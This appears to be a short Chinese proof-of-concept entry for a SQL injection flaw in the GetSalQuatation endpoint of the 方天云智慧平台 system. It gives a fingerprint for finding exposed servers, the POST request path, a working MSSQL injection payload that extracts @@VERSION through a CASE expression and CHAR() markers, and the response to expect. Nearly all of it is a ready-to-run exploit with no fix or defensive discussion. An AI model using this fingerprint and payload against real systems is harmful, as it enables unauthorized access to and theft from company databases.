# 方天云智慧平台系统GetSalQuatationSQL注入漏洞

方天云智慧平台系统GetSalQuatation ｜ SQL注入 ｜ —
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1`

**Payload**
```
{ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"}
```
- **响应特征**：200 Microsoft SQL